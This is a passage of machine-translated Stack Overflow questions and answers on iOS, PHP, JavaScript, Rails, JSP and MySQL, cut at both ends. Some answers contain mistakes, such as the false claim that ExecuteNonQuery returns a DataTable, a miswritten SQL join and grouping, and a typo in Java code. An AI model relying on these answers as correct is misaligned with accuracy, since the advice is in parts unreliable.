> 时间：2012-07-02T09:08:13.660

我认为您主要关心的是如何在您的应用程序处于后台时接收新消息。因为当我可以通过 WhatsApp 之类的应用程序接收通知时，我不会整天打开一个信使应用程序。

比 TCPIP 套接字更好，您可以使用[websockets](https://github.com/square/SocketRocket/)。由于它是 HTTP，因此没有防火墙问题，但需要与前台的应用程序建立永久连接，这会耗尽电池。

并且因为只有音乐、位置或语音 ip 被允许在后台运行，所以除非应用程序打开，否则您无法进行轮询。请注意，如果您注册这些后台任务并执行其他操作，Apple 会注意到并拒绝您的应用程序。

因此，请使用 APNS。这就是 WhatsApp 所做的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-02T09:05:01.187

使用 XMPP SERVER 进行聊天

[http://mobile.tutsplus.com/tutorials/iphone/building-a-jabber-client-for-ios-xmpp-integration/](http://mobile.tutsplus.com/tutorials/iphone/building-a-jabber-client-for-ios-xmpp-integration/)

我希望这个链接对你有用。

# python - 将二维列表添加在一起

> ID：11271759
> 
> 赞同：-2
> 
> 时间：2012-06-30T05:37:42.747
> 
> 标签：python

我从 Python 得到以下输出：

```
x1 = [[1, 1, 6, 12, 75, 75], [2, 2, 12, 36, 225, 300], [3, 3, 24, 84, 525, 825], [4, 4, 48, 180, 1125, 1950], [5, 5, 96, 372, 2325, 4275], [6, 6, 192, 756, 2835, 7110], [7, 7, 384, 1524, 5715, 12825], [8, 8, 768, 3060, 7650, 20475]]
x2 = [[1, 2, 6, 12, 75, 75], [2, 3, 12, 36, 225, 300], [3, 4, 24, 84, 525, 825], [4, 5, 48, 180, 1125, 1950], [5, 6, 96, 372, 2325, 4275], [6, 7, 192, 756, 2835, 7110]]
x3 = [[1, 3, 6, 12, 75, 75], [2, 4, 12, 36, 225, 300], [3, 5, 24, 84, 525, 825], [4, 6, 48, 180, 1125, 1950], [5, 7, 96, 372, 2325, 4275]]
x4 = [[1, 4, 6, 12, 75, 75], [2, 5, 12, 36, 225, 300], [3, 6, 24, 84, 525, 825], [4, 7, 48, 180, 1125, 1950]] 
```

基本上我想通过匹配每个列表中的第二个数字来添加这些列表（第二个数字代表一个月，而它后面的其他数字代表成员或利润）。

因此，如果我们查看列表`x1`and `x2`，我想将`x1[1]`and`x2[0]`连接在一起，因为它们在第二个元素（即`x1[1][1]`and `x2[0][1]`）处相等。

通过加入我的意思是我想添加它们。理想情况下，我宁愿只将第 3 到 6 个元素加在一起。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T06:02:49.000

您应该检查使用 [列表推导](http://docs.python.org/tutorial/datastructures.html#list-comprehensions)和[切片列表](http://docs.python.org/tutorial/introduction.html#lists)。这基本上会让你转：

> 我宁愿只将第 3 到 6 个元素加在一起。

进入你想要做的事情。要合并列表，您可以尝试创建一个 dict 并在最后将它们相加。我不是 100% 清楚整个列表中的预期输出应该是什么，并且它在某种程度上取决于代码中发生的其他事情。

# iphone - 一键触发多个视图上的事件？

> ID：11271761
> 
> 赞同：0
> 
> 时间：2012-06-30T05:38:00.830
> 
> 标签：iphone, objective-c, ios, uiview, uibutton

在我的程序中，我将 a`UIButton`作为 a 的子视图`UIView`，两者都`userInteractionEnabled`设置为`true`。当按钮被点击时，会调用一个事件来处理按钮点击，它按预期工作。但是，按钮的`UIView`超级视图也处理在这种情况下不应触发的事件。谁能解释为什么`UIButton`AND`UIView`都触发了一个事件？任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T06:49:41.370

我找到了一个解决方案：我只是将按钮设置为处理不需要的事件的视图的超级视图，而不是子视图。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T06:02:28.737

您是否应该在按钮完成其职责后辞去第一响应者的职务，以使按钮所在的视图不再受控制。

如何添加：**bringSubviewtoFront:scrollview**

到 UIButton 代码的末尾。这里的想法是让您的 uiview 成为最重要的视图；当您触摸 uiview 并因此重新激活触发事件时，这就是我认为正在发生的事情

# php - 为什么不能在 oci_excute 上执行完美的 SQL 语句？

> ID：11271762
> 
> 赞同：0
> 
> 时间：2012-06-30T05:38:17.733
> 
> 标签：php, sql, oracle, oci8

我有一些 PHP 代码通过 OCI8 库写入 Oracle 数据库。我有一个不会以编程方式执行的插入语句 - 如果我打印出该语句并通过 SquirrelSQL 运行它，它将成功插入数据。我在代码的其他地方有删除和选择语句，它们运行良好。可能是什么问题？正如我所说，如果我打印 $om_query 并手动运行它会成功插入。我没有收到任何其他错误。

```
$om_query = "INSERT INTO DB.TABLE(R1,R2) VALUES(V1,V2)";
$s2 = oci_parse($conn, $om_query);
$qs = oci_execute($s2);
oci_commit ($conn); 

if(!$qs){
    $ma = oci_error();
    $failedqueries .= '<br /><br />MAINQ: ' . $om_query . '<br /><b>OCI_ERROR_MSG: </b>' . $ma['message'];
} 
```

`oci_error()`不附加任何有用的东西。

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2015-03-18T18:49:24.617

检查您是否在受影响的表上没有打开的事务。PL 可能正在尝试删除插入的记录。

在 Oracle 中，您必须在修改数据（无论是通过插入、更新还是删除）后执行 COMMIT 或 ROLLBACK 操作。

# javascript - 如何在鼠标悬停时动态更改帧大小

> ID：11271764
> 
> 赞同：1
> 
> 时间：2012-06-30T05:38:40.403
> 
> 标签：javascript, html, frame

您能告诉我如何在鼠标悬停时更改帧大小吗？

例如：

```
<html>
<frameset rows="70%,30%">
<frame src="page1.htm">
<frame src="page2.htm">
</frameset>
</html> 
```

鼠标悬停应该变成这样：

```
<frameset rows="40%,60%"> 
```

还有什么办法我们可以这样做吗？

```
 <frameset rows="40%,60%"> ---> <frameset rows="70%,30%">  ---> <frameset rows="40%,60%">
 (after loading webpage;        (after 5 seconds)               (on mouse over)
     for 5 seconds) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T05:54:41.473

代码：

```
<html>
<head>
<script>
var already=false;
var frameset;
window.onload=function(){frameset=document.getElementById("foo");};
setTimeout(modify,5000);
function modify()
{
    already=true;
    frameset.setAttribute("rows","70%,30%");
}
function big()
{
    if(already)frameset.setAttribute("rows","70%,30%");
}
function small()
{
    if(already)frameset.setAttribute("rows","40%,60%");
}
</script>
</head>
<frameset rows="40%,60%" id="foo" >
<frame src="page1.htm">
<frame src="page2.htm" onmouseover="small();" onmouseout="big();">
</frameset>
</html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T05:43:56.110

您可以使用 JQUERY 更改帧大小。其中已经定义了一个效果动画。它很容易做到。

# activerecord - 使用区域设置通过 Globalize3 翻译对关联的 ActiveRecord 查询响应进行排序

> ID：11271765
> 
> 赞同：2
> 
> 时间：2012-06-30T05:39:11.313
> 
> 标签：activerecord, internationalization, translation, ruby-on-rails-3.2, globalize3

我总共有两个模型和三个表。不幸的是，模型从原始表名发生了一些重命名，所以请原谅混乱。：

```
Symptom (chief_complaints)
SymptomName (chief_complaint_names)
(chief_complaint_name_translations) 
```

后者当然被 Globalize3 用来转换 SymptomName 模型的 :name 属性。症状 has_many :symptom_names。

考虑以下：

```
Symptom.includes(names: :translations).order("chief_complaint_name_translations.name ASC") 
```

这会返回一个基本正确的列表，但它会按遇到的第一个翻译名称（尽管我的语言环境）对症状列表进行排序，并按正确的语言环境列出它们。

```
# .to_sql output
"SELECT `chief_complaints`.* FROM `chief_complaints` INNER JOIN `chief_complaint_names` ON `chief_complaint_names`.`chief_complaint_id` = `chief_complaints`.`id` INNER JOIN `chief_complaint_name_translations` ON `chief_complaint_names`.`id` = `chief_complaint_name_translations`.`chief_complaint_name_id` ORDER BY chief_complaint_name_translations.name, chief_complaint_name_translations.name ASC"

# Actual SQL generated in the console
SELECT `chief_complaints`.* FROM `chief_complaints` INNER JOIN `chief_complaint_names` ON `chief_complaint_names`.`chief_complaint_id` = `chief_complaints`.`id` INNER JOIN `chief_complaint_name_translations` ON `chief_complaint_names`.`id` = `chief_complaint_name_translations`.`chief_complaint_name_id` ORDER BY chief_complaint_name_translations.name, chief_complaint_name_translations.name ASC
SELECT `chief_complaint_names`.`id` AS t0_r0, `chief_complaint_names`.`chief_complaint_id` AS t0_r1, `chief_complaint_names`.`created_at` AS t0_r2, `chief_complaint_names`.`updated_at` AS t0_r3, `chief_complaint_name_translations`.`id` AS t1_r0, `chief_complaint_name_translations`.`chief_complaint_name_id` AS t1_r1, `chief_complaint_name_translations`.`locale` AS t1_r2, `chief_complaint_name_translations`.`name` AS t1_r3, `chief_complaint_name_translations`.`created_at` AS t1_r4, `chief_complaint_name_translations`.`updated_at` AS t1_r5, `chief_complaint_name_translations`.`url` AS t1_r6 FROM `chief_complaint_names` LEFT OUTER JOIN `chief_complaint_name_translations` ON `chief_complaint_name_translations`.`chief_complaint_name_id` = `chief_complaint_names`.`id` WHERE `chief_complaint_name_translations`.`locale` = 'en' AND `chief_complaint_names`.`chief_complaint_id` IN (173, 2, 1, 224, 223, 3, 75, 4, 186, 15, 199, 201, 5, 177, 245, 94, 219, 225, 241, 6, 228, 213, 234, 164, 88, 26, 81, 7, 74, 136, 57, 21, 28, 18, 163, 165, 8, 112, 183, 147, 9, 160, 10, 64, 218, 170, 200, 207, 11, 175, 13, 138, 72, 12, 214, 239, 248, 14, 150, 190, 137, 16, 17, 154, 178, 127, 56, 206, 246, 101, 19, 20, 22, 96, 172, 255, 23, 24, 216, 25, 215, 29, 125, 113, 198, 195, 244, 27, 247, 132, 232, 70, 135, 133, 30, 31, 34, 32, 197, 181, 222, 208, 243, 35, 227, 196, 33, 36, 179, 53, 131, 126, 159, 58, 37, 202, 203, 38, 120, 68, 220, 230, 176, 39, 226, 148, 174, 91, 40, 41, 145, 151, 134, 189, 73, 43, 42, 47, 93, 44, 45, 46, 209, 192, 204, 205, 48, 188, 128, 49, 212, 249, 250, 211, 153, 50, 51, 52, 139, 187, 237, 109, 156, 129, 54, 157, 55, 87, 69, 84, 146, 60, 149, 221, 231, 242, 229, 59, 194, 240, 155, 61, 158, 62, 171, 180, 67, 63, 236, 65, 66, 162, 71, 152, 191, 76, 77, 78, 79, 80, 82, 83, 103, 92, 98, 118, 85, 100, 89, 116, 114, 115, 104, 99, 111, 86, 97, 122, 251, 90, 238, 193, 254, 95, 252, 130, 235, 233, 102, 121, 123, 105, 106, 107, 108, 110, 217) ORDER BY name 
```

您会注意到此查询中没有提及“locale”或“en”。如果我对 SymptomName 进行查询，包括 with_translations 方法，将语言环境传递给它，它会完全按照我的预期编写查询。

```
>> SymptomName.with_translations(I18n.locale).to_sql
=> "SELECT `chief_complaint_names`.* FROM `chief_complaint_names` WHERE `chief_complaint_name_translations`.`locale` = 'en' ORDER BY name" 
```

如何*正确地*将语言环境注入到第一个查询中，并让它根据关联的 SymptomNames 对我的症状列表进行排序。值得注意的是，我在 Symptom 上有一个方法，它返回它遇到的第一个 SymptomName。

我需要这个来按从语言环境派生的名称对列表进行排序，并显示正确的名称。有什么想法吗？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-05T18:25:46.657

对使用此 gem 的其他人来说只是一个小更新。我惊讶地发现 gem 实际上为每个具有翻译的模型创建了一个新模型。这个新模型与原始模型具有相同的名称，并附加了`::Translation`. 所以`SymptomName`会有一个`SymptomName::Translation`模型。此模型具有可访问的已翻译属性，例如`SymptomName::Translation.first.name`.

不幸的是，这种新模型似乎无法像人们预期的那样直接访问它的同名模型。没有 SymptomName::Translation.first.symptom`。

反映所有关联确实揭示了从翻译模型到所述模型的关系，但是该关联不能通过正常链获得。

我们最终创建了自己的模型来访问这个名为 的表`SymptomNameTranslation`，并将适当的关联和连接添加为 default_scope。似乎工作得很好，但是在宝石本身中有这个会很好。可能是修补所述宝石的好机会。

# ios - RestKit 映射：一次映射不同的对象

> ID：11271768
> 
> 赞同：2
> 
> 时间：2012-06-30T05:40:02.433
> 
> 标签：ios, rest, networking, restkit

我有这样的 JSON

```
{
  "result" : 1,
  "messages" : [],
  "users" : {}
} 
```

两者都`messages`被`users`填充。

如果我想映射，例如`messages`，我会执行以下操作：

```
messageMapping = [RKObjectMapping mappingForClass:[OLMessage class]];
[messageMapping mapKeyPath:@"user_id" toAttribute:@"userID"];
[messageMapping mapKeyPath:@"status" toAttribute:@"status"];
[messageMapping mapKeyPath:@"text" toAttribute:@"text"];
[messageMapping mapKeyPath:@"date_time" toAttribute:@"date_time"];

messageManager = [RKObjectManager managerWithBaseURLString:baseURL];
[messageManager.mappingProvider setMapping:messageMapping forKeyPath:@"messages"];

[messageManager loadObjectsAtResourcePath:@"/messages/fetch" usingBlock:^(RKObjectLoader *loader) { ... }; 
```

我收到了我的信息。

如何设置我的映射以获得`users`相同的调用`loadObjectsAtResourcePath`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-02T06:50:41.077

以类似的方式创建映射并设置：

```
[messageManager.mappingProvider setMapping: userMapping forKeyPath:@"users"]; 
```

# javascript - 如何将 2 个或更多参数从 HTML 输入传递到 Javascript 函数

> ID：11271769
> 
> 赞同：2
> 
> 时间：2012-06-30T05:40:15.007
> 
> 标签：javascript, html, input, arguments

我有这些输入：

```
<input type='radio' id='1' name='s' onclick='pieces(this.value);'  value='6'>6
<input type='radio' id='2' name='s' onclick='pieces(this.value);'  value='12'>12
<input type='radio' id='3' name='s' onclick='pieces(this.value);'  value='24'>24
<input type='radio' id='11' name='v' onclick='pieces(this.value);'  value='yes'>Yes
<input type='radio' id='12' name='v' onclick='pieces(this.value);'  value='no'>No 
```

`pieces(var1, var2)`当单击单选按钮时，我想将“name='s'”中的值传递给 var1，并将“name='v'”中的值传递给 var2 。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T06:01:02.893

您可以使用方法在 Javascript 方法本身中获取两个无线电输入的值，`document.getElementsByName()`或者这也应该有效，
尝试使用`func(document.getElementsByName('s'),document.getElementsByName('v'))`

下面的代码应该有帮助，

```
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>Insert title here</title>
<script src="js1/jquery.js" type="text/javascript"></script>
<script type="text/javascript">
$(document).ready(function(){
    alert('Ok');
    $('#btn').click(function(){
        var r1=$('input:radio[name=s]').val();
        var r2=$('input:radio[name=v]').val();
        show(r1,r2);
    });
});

function show(r1,r2){
    alert(r1);
    alert(r2);
}
</script>
</head>
<body>
<input type='radio' id='1' name='s' onclick='pieces(this.value);'  value='6'>6
<input type='radio' id='2' name='s' onclick='pieces(this.value);'  value='12'>12
<input type='radio' id='3' name='s' onclick='pieces(this.value);'  value='24'>24

<input type='radio' id='11' name='v' onclick='pieces(this.value);'  value='yes'>Yes
<input type='radio' id='12' name='v' onclick='pieces(this.value);'  value='no'>No

<button id="btn">Submit</button>
</body>
</html> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T06:08:22.807

您可以通过以下不同方式传递参数：

```
function antguider(name, url){
    alert("Name = "+name+" URL = "+url);
} 
```

HTML 部分

```
<input type="button" onclick=antguider('AntGuider','http://antguider.blogspot.com') value="Click Without Quotation" />
<input type="button" onclick="antguider('AntGuider','http://antguider.blogspot.com')" value="Click With Quotation" />
<input type="button" onclick="antguider(12345,'http://antguider.blogspot.com')" value="No Quotation Needed For Button" /> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T05:52:56.047

对于 2 个输入，这可以使用 JQuery 轻松完成。

```
va1=$("input[name=s]").val();
va2=$("input[name=v]").val(); 
```

然后调用所需的函数，将您的值作为参数传递。

```
func(va1,va2); 
```

# jsp - JSP 写入文本文件

> ID：11271770
> 
> 赞同：2
> 
> 时间：2012-06-30T05:40:17.787
> 
> 标签：jsp, text

我正在使用提交按钮创建 HTML 输入表单。表单操作将我们带到一个 jsp 页面。我在我的 JSP 页面上写了这个

```
 ServletContext context = this.getServletContext();

        String path = context.getRealPath("WEB-INF/list.txt");

        User user = new User(fName, lName, eAddress, phone, company, webinar,dateObj);
        UserIO.add(user, path); 
```

然后我创建了一个名为 UserIO 的 java 类

```
public class UserIO {

    public static void add(User user, String path) throws IOException  
     {
        FileOutputStream fos= new FileOutputStream(path, true);

        PrintWriter out = new PrintWriter(fos);//, true));

        out.println(user.getFname() + "|" + user.getLname() + "|" + user.getEmail() + "|"   );
         out.println(user.getPhone() + "|" + user.getCompany() + "|" + user.getWebinar() + "|" + user.getDate());

        out.close();
    }

} 
```

现在我的问题是，输出显示在 JSP 页面上，但不保存到文本文件。

我在 Netbeans 中完成了这个程序，并将文件保存在`<projectname>/web/WEB-INF`.

我尝试将路径更改为`<projectname>/web/WEB-INF/list.txt`但给我错误消息。所以卡住改变它如上。

告诉我你的专家意见如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-29T13:22:52.720

在您的项目 'build\web\WEB-INF\' 目录（）中查找 txt 文件。我遇到了同样的问题，然后我在给定目录中找到了文本文件。:-) 顺便说一句，我的意思是如果您使用的是 Netbeans IDE..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-04T04:54:42.600

我想，我找到了你的答案：
尝试使用这个：（

*我假设找到了文件）*
要写入你的文件，你应该用这些替换你的代码：

```
FileOutputStream fos= new FileOutputStream(path, true);
fos.write((user.getFname() + "|" + user.getLname() + "|" + user.getEmail() + "|").getBytes());
fors.write((user.getPhone() + "|" + user.getCompany() + "|" + user.getWebinar() + "|" + user.getDate()).getBytes()); 
```

并做了！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T06:28:04.907

您必须提供 FileOutputStream 正确的路径！
eclipse 目录中是否有任何名为 WEB-INF 的文件夹。我想不是！
尝试使用这些行来了解文件的创建位置：

```
File file = new File("list.txt");
System.out.println(file.getCanonicalFile()); 
```

# javascript - 如何在 Javascript 函数中使用 Ruby？

> ID：11271783
> 
> 赞同：0
> 
> 时间：2012-06-30T05:43:42.303
> 
> 标签：javascript, ruby-on-rails

我意识到这在我的问题措辞方式上是不可能的，但是有没有办法仍然得到我正在寻找的结果。

在 Rails 3.2 应用程序中，我有一个包含 City 和 Location 字段的表单：

```
<%= f.select :city, City.all, :prompt => "Select..." %>
<%= f.input :location_name, :input_html => {    data:{ autocomplete_source: Location.order(:name).map(&:name) } } %> 
```

location 字段使用 Twitter Bootstrap 的 typeahead 功能来显示条目的自动完成列表。

一个位置属于一个城市。我想根据用户选择的城市值过滤自动完成条目列表。

基本上，我需要动态改变

```
... autocomplete_source: Location.order(:name).map(&:name) ... 
```

至

```
... autocomplete_source: Location.where('city_id => ?', '@myform.city.id').order(:name).map(&:name) ... 
```

在咖啡脚本中，我可以执行以下操作：

```
jQuery -> 
  $('#myform_city_id').change ->
    $('#myform_location_name').attr('data-autocomplete-source','#{Location.where(city_id: @myform.city_id).order(:name).map(&:name)}') 
```

但是没有调用活动记录查询，它只是作为字符串传入。

使用新查询动态更改此 autocomplete-source 属性的最佳方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T16:13:11.057

你不能这样做，因为 Javascript 在客户端，Ruby 在服务器端运行。由于这个原因，Javascript 不会“看到”Ruby（ERB 有点不同：它在客户端接收之前被转换为 HTML）。我建议您通过[Ajax 请求](http://dharmaprogramming.wordpress.com/2012/06/13/dont-send-javascript-as-an-ajax-response/)来执行此操作。

更好地解释：您从一个控制器执行一个操作，该控制器为您提供所需内容的 JSON 表示（它甚至可以是现有控制器，但将其作为 JSON 发送）。您通过 Ajax 调用此控制器（`:remote => true`在您的链接上使用）。您将 ajax:complete 响应事件从该链接绑定到一个函数，如下所示：

```
$("#link_id").bind "ajax:complete", (e, xhr, settings) ->
    #TODO function body goes here 
```

或这个：

```
$("#link_id").bind "ajax:complete", functionName 
```

在此函数内部，您可以解析 JSON`jQuery.parseJSON(xhr.responseText)`并使用此数据执行您想要的操作。看似复杂，其实很简单。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-21T06:00:37.763

将您的咖啡脚本从 filename.js.coffee 重命名为 filename.js.coffee.erb。然后你可以做这样的事情：

```
jQuery -> 
  $('#myform_city_id').change ->
    $('#myform_location_name').attr('data-autocomplete-source','<%= Location.where(city_id: @myform.city_id).order(:name).map(&:name) %>') 
```

# python - 由于 osgProducer 链接错误，无法安装 PyOSG

> ID：11271787
> 
> 赞同：2
> 
> 时间：2012-06-30T05:43:53.987
> 
> 标签：python, opengl, ld, openscenegraph

我正在尝试使用`pip install PyOSG`.

但它失败了这个错误：

```
g++ -pthread -shared -Wl,-O1 -Wl,-Bsymbolic-functions build/temp.linux-x86_64-2.6/Producer/Referenced.o build/temp.linux-x86_64-2.6/Producer/Camera.o build/temp.linux-x86_64-2.6/Producer/RenderSurface.o build/temp.linux-x86_64-2.6/Producer/KeyboardMouse.o build/temp.linux-x86_64-2.6/Producer/buildinfo.o build/temp.linux-x86_64-2.6/Producer/Block.o build/temp.linux-x86_64-2.6/Producer/Keyboard.o build/temp.linux-x86_64-2.6/Producer/Timer.o build/temp.linux-x86_64-2.6/Producer/VisualChooser.o build/temp.linux-x86_64-2.6/Producer/CameraConfig.o build/temp.linux-x86_64-2.6/Producer/Producer.o build/temp.linux-x86_64-2.6/Producer/CameraGroup.o build/temp.linux-x86_64-2.6/Producer/Trackball.o build/temp.linux-x86_64-2.6/Producer/Events.o build/temp.linux-x86_64-2.6/Producer/InputArea.o build/temp.linux-x86_64-2.6/Producer/Math.o -lboost_python -lOpenThreads -lProducer -lProducer -losg -losgDB -losgFX -losgGA -losgParticle -losgProducer -losgSim -losgUtil -losgText -o build/lib.linux-x86_64-2.6/PyOSG/_Producer.so

/usr/bin/ld: cannot find -losgProducer

collect2: ld returned 1 exit status

error: command 'g++' failed with exit status 1 
```

我已经安装`Producer`了依赖于 OSG 的，所以我不应该安装什么来使链接成功。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-02T19:46:30.763

Producer 至少已经过时了几年，被 osgViewer 和相关类取代，至少可以追溯到 1.0 版，可能在此之前也是如此。

尝试寻找更新版本的 PyOSG，或尝试其中一个更活跃的项目，例如：

osgSWIG（包括 Python）[http://code.google.com/p/osgswig/](http://code.google.com/p/osgswig/)

osgboostpyton： [http ://code.google.com/p/osgboostpython/](http://code.google.com/p/osgboostpython/)

祝你好运！

# php - 使用 htaccess 来防止调用页面，除了 RewriteRule

> ID：11271791
> 
> 赞同：3
> 
> 时间：2012-06-30T05:44:24.267
> 
> 标签：php, .htaccess, mod-rewrite

是否可以使用 .htaccess 来防止页面被提供，除非它是通过重写规则？例如，我有干净的 URL，所以调用`xyz.com/hi`服务`xyz.com/hi.php`。

`xyz.com/hi.php`如果调用的 url =页面得到服务，我想实现`opps.html`，但正常`xyz.com/hi`仍然有效。

谢谢艺术

```
DirectoryIndex h1.php
Options +FollowSymLinks
RewriteEngine on
RewriteBase /

# stop calling page by ext
RewriteRule .*\.(php)$ opps.html [L]

# main start page
RewriteRule ^hi$ hi.php [L] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T16:13:07.667

您需要添加一个条件以防止 php 扩展被重写为`oops.html`. 如果你想阻止对 php 页面的实际请求，你可以`%{THE_REQUEST}`在 a 中使用变量`RewriteCond`：

```
RewriteCond %{THE_REQUEST} ^[A-Z]{3,9}\ /.*\.php\ 
RewriteRule .*\.(php)$ opps.html [L] 
```

这样，内部重写的 URI`.php`不会被重写为`oops.html`.

# php - Jquery 图片上传脚本和 PHP 会话

> ID：11271795
> 
> 赞同：1
> 
> 时间：2012-06-30T05:45:04.260
> 
> 标签：php, jquery, ajax, file-upload

我已经成功实现了这个脚本：[http ://blueimp.github.com/jQuery-File-Upload/](http://blueimp.github.com/jQuery-File-Upload/)

（它使用jquery文件上传）

问题是我正在使用以下 PHP 登录脚本来猜测它：[http ://phpsense.com/2006/php-login-script/](http://phpsense.com/2006/php-login-script/)

图片上传脚本调用 php 文件通过 ajax 删除/上传图片。我想保护该 php 文件，以便只有登录的用户才能访问它（因为管理员使用我的脚本来更新站点）。

我将它包含在名为的 php 文件中

```
session_start();

//Check whether the session variable SESS_MEMBER_ID is present or not
if(!isset($_SESSION['SESS_MEMBER_ID']) || (trim($_SESSION['SESS_MEMBER_ID']) == '')) {
    header("location: access-denied.php");
    exit();
} 
```

当我尝试通过脚本访问该页面时，它说会话变量为 NULL 失败（即使他们登录了用户也没有登录）。

**真正奇怪的是它的随机性。** 如果我一遍又一遍地刷新页面，它最终会成功找到会话变量并加载图像。

我首先确定的是 URL 是一致的，所以我对所有的 ajax 调用都使用了完整的 URL，所以这不是问题......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-30T06:03:30.173

使用这行代码：

```
var_dump($_SESSION); 
```

看看它打印了什么。然后检查浏览器上的查询。看看它是否可以接受 cookie

# javascript - o << {a: a, b: b}; 是什么意思？做？

> ID：11271798
> 
> 赞同：4
> 
> 时间：2012-06-30T05:46:21.053
> 
> 标签：javascript

在[Bitwise 与 Assoc Array 迭代](http://jsperf.com/bitwise-versus-assoc-array-iteration/2)测试中，有以下代码段：

```
var arr = [1,0,1,0,0,0,0,0,1,1,0,0,1];
var o = [];
for(var i = 0; i < 100; i++){
    var a = [(Math.random > 0.5 ? 0 : 1), (Math.random > 0.5 ? 0 : 1), (Math.random > 0.5 ? 0 : 1), (Math.random > 0.5 ? 0 : 1), (Math.random > 0.5 ? 0 : 1), (Math.random > 0.5 ? 0 : 1), (Math.random > 0.5 ? 0 : 1), (Math.random > 0.5 ? 0 : 1), (Math.random > 0.5 ? 0 : 1), (Math.random > 0.5 ? 0 : 1), (Math.random > 0.5 ? 0 : 1), (Math.random > 0.5 ? 0 : 1), (Math.random > 0.5 ? 0 : 1)];
    var b = 0;
    for(var j=0; j < a.length; j++){
            b |= (a[j] << j);               
    }
    o << {a: a, b: b};
} 
```

它为测试目的准备数据。最后一句话对我来说没有意义，除了它有一个左移的事实。解释器不会抛出错误，它只是默默地接受它。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T05:52:22.003

这让我有点想哭。没有**在 Array 上定义****运算符`<<`**；它*只是*JavaScript 中的按位左移。（尽管*不同的*语言，如 Ruby，确实在 Array 类型上定义了这样的运算符。）

因此，它*大致*相当于（在内部，两个操作数都通过本机`ToInt32`函数进行转换）：

```
parseInt(o) << parseInt({a: a, b: b}) 
```

一些警告标志应该会熄灭：

*   `parseInt`这里（或）的[有意义的]结果是`ToInt32`什么？
*   结果`<<`去哪儿了？

* * *

与此简化代码进行比较：

```
var o = []
o << 1
o            // -> []
o.push(2)    // (as suggested by 6502 as the desired operation)
o            // -> [2] 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-30T06:01:43.800

也许**想要**的意思是`o.push({a:a, b:b})`。

我不知道这是否适用于某些损坏的实现，但这不是标准的。

# mysql - 在 VB 2010 文本框中显示 MySQL 数据库表数据

> ID：11271801
> 
> 赞同：0
> 
> 时间：2012-06-30T05:46:37.810
> 
> 标签：mysql, visual-studio-2010

我能够使用以下代码显示我的 MySQL 表中的数据：datardr = cmd.ExecuteReader

```
 If datardr.HasRows Then
        datardr.Read()
        tb_lname.Text = datardr("SURNAME")
        tb_fname.Text = datardr("GIVEN")
        tb_mname.Text = datardr("MID")
        tb_mi.Text = datardr("MIDDLE")
        tb_app.Text = datardr("APPELLATION")
        tb_prefix.Text = datardr("PREFIX")
        tb_sex.Text = datardr("SEX")
        tb_status.Text = datardr("STATUS")
    End If 
```

但是，我注意到它没有显示来自这些字段的所有数据。我只能查看 SURNAME、GIVEN、MID 和 MIDDLE，但不显示其他的。我已经仔细检查了我的数据库字段，我确定它们是相同的，并且没有特殊字符或空格。

请帮忙。谢谢！

这是我拥有的确切代码 => [VB2010 和 MySQL 代码](http://pastebin.com/embed_js.php?i=bmBXikXM)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T06:07:12.657

我认为您最好检查传递给命令对象的 sql 语句，`cmd`.
也许您没有使用 选择整个记录`select *`。

而且，还有一个建议。
如果`datardr`是`DataReader`，我强烈建议您**不要**使用它。它引起的问题比它所服务的要多。
更灵活的方法是只使用`DataTable`.
命令对象具有`ExecuteNonQuery`返回`DataTable`对象的方法。
它比 DataReader 更灵活、更易于使用。相信我...！;-)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-01T17:14:33.713

好的，这里有另一个答案给你。

我认为这是因为您在**第 21 行**的 SQL 语句。
我假设您选择了**一条**记录（对吗？），以便您可以将结果字段插入文本框中。并且，您使用 SURNAME 对结果进行排序。
您是否仔细检查了表中是否已有数据`masterlist`？特别是检查，如果您已经在每一行的每个字段中输入了数据。

在第 30 行，你调用`datardr.Read()`了方法，所以 DataReader 对象`datardr`将读取它在 sql 语句的结果中遇到的第一条记录行。我认为只有第一条记录的**四个**字段，，，`SURNAME`和有数据值`GIVEN`，以及任何其他字段包含空值。因此，您只在文本框中看到了这四个值，而任何其他字段似乎都是空白的。`MID``MIDDLE`

我认为这可能是主要问题。只需检查您想要出现的数据是否已经存在于数据库表中。好的！

还有另一个建议。您不认为您的 SQL 语句中可能需要 WHERE 子句吗？好吧，您只想显示一条记录，不是吗？

**祝你好运！！！:-)**

# mysql - 如何使用 count() 运行选择查询？

> ID：11271804
> 
> 赞同：0
> 
> 时间：2012-06-30T05:47:14.023
> 
> 标签：mysql, database, indexing

```
account_users
-----
id | primary_key

posts
-----
post_id | primary_key
author | foreign key to account_users.id 
```

假设我有 2 张桌子。account_users 有用户。职位持有职位。

如何选择帖子计数（*）超过 5 个的所有用户？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T05:52:07.247

试试这个

```
SELECT au.*,p.*
FROM account_users au
INNER JOIN posts p
ON p.account_users.id = au.id
GROUP BY p.post_id
HAVING count(*) > 5 
```

* * *

## 回答 #2

> 赞同：0
> 
